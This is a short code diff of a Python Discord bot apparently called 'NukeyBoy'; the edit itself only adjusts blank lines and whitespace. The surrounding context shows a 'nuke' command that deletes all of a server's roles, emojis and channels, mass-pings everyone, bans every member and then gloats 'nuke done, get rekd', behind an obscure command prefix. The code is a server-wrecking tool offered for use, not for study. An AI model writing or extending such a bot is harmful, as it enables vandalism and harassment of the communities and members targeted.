@@ -10,6 +10,7 @@ bot = commands.Bot(
     command_prefix="_?_", help_command=None, intents=discord.Intents.all()
 )
 
+
 async def del_roles(ctx):
     roles = ctx.guild.roles
     for role in roles:
@@ -65,12 +66,13 @@ async def nuke(ctx, ping: int, ban=None):
         await del_roles(ctx)
         await del_emojis(ctx)
         await del_channels(ctx)
-        
+
         if ping:
             await ping_everyone(ctx, ping)
         if ban:
             await ban_everyone(ctx)
         await ctx.send("nuke done, get rekd")
+
 
 dotenv.load_dotenv()
 bot.run(os.environ["NUKEYBOY_TOKEN"])  # bot token
